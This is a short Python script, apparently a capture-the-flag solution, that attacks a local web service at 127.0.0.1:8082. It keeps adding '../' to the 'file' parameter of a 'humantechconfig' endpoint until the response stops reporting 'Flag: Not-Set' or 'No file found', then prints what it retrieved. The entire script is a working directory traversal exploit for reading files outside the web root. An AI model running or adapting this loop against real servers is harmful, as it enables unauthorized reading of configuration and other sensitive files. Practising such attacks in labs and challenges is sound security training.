import urllib.request

folder = ''
url = 'http://127.0.0.1:8082/humantechconfig?file=' + folder + 'human.conf'

response =  urllib.request.urlopen(url).read()
while (b"Flag: Not-Set" in response) or (b"No file found" in response):
	folder += '../'
	url = 'http://127.0.0.1:8082/humantechconfig?file=' + folder + 'human.conf'
	response = urllib.request.urlopen(url).read()

print(response)
